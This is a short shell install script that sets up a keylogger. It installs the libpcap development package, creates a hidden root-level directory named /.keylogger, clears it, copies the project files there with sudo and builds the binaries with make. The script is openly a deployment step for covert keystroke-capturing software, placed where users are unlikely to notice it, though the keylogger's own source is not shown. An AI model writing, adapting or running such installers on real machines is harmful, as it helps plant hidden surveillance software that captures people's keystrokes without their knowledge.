#!/bin/sh
# Assume root access for all of this to make our lives easier.

# Install libpcap-dev if it is already not on the system.
sudo apt-get install libpcap0.8-dev

# Create the folder where the keylogger will live. If it already
# exists then delete all containing files.
sudo mkdir /.keylogger
sudo rm /.keylogger/*
sudo cp -r . /.keylogger
cd /.keylogger

# Create the binaries.
make
